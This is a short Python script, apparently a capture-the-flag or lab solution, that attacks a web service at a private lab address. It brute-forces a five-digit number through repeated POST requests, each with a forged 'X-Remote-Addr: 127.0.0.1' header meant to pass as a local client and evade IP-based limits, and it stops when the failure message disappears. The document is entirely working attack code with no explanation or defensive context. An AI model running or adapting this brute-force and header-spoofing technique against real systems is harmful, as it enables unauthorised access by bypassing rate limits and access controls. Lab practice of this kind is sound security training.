#!/usr/bin/env python3

import requests
import sys

url = "http://10.10.10.10:8085/"
s = requests.Session()

for number in range (10000,99999):
    headerd = {"X-Remote-Addr" : "127.0.0.1"}
    data = {"number" : number}
    output = s.post(url, headers=headerd, data=data)

    if "Oh no! How unlucky. Spin the wheel and try again." in output.text:
        pass
    else:
        print(f"WE GOT DA NUMBAH: {number}")
        sys.exit(0)